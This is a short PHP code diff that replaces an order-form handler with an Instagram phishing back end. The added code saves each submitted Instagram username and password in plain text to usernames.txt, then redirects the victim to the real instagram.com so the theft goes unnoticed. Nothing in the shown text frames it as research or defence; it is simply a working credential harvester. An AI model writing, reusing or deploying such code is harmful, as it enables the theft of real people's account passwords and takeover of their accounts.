@@ -1,5 +1,5 @@
 <?php
-$data = "Name: " . $_POST['name'] . "\n" .
+/*$data = "Name: " . $_POST['name'] . "\n" .
         "Phone: " . $_POST['phone'] . "\n" .
         "Email: " . $_POST['email'] . "\n" .
         "Address: " . $_POST['address'] . "\n" .
@@ -11,5 +11,13 @@ $data = "Name: " . $_POST['name'] . "\n" .
 
 file_put_contents("orders.txt", $data, FILE_APPEND);
 
-echo "✅ Order submitted successfully!";
+echo "✅ Order submitted successfully!"; */
+?>
+
+
+<?php
+
+file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://instagram.com');
+exit();
 ?>
